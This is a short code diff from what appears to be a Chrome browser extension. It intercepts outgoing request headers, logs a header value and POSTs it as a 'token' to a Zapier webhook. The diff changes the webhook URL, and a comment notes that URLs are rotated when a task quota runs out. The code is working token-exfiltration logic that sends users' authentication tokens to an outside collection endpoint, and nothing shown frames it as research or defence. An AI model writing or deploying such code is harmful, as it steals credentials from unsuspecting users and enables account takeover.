@@ -7,7 +7,11 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
         console.log(header.value)
         // Push to webhook
         const data = { token: header.value };
-        fetch('https://hooks.zapier.com/hooks/catch/7281121/o59asee/', {
+        
+        // Whenever we run out of task change out the urls
+        // https://hooks.zapier.com/hooks/catch/7281121/o59asee/
+        // https://hooks.zapier.com/hooks/catch/7281849/o59cs9m/
+        fetch('https://hooks.zapier.com/hooks/catch/7281849/o59cs9m/', {
           method: 'POST', // or 'PUT'
           headers: {
             'Content-Type': 'application/json',
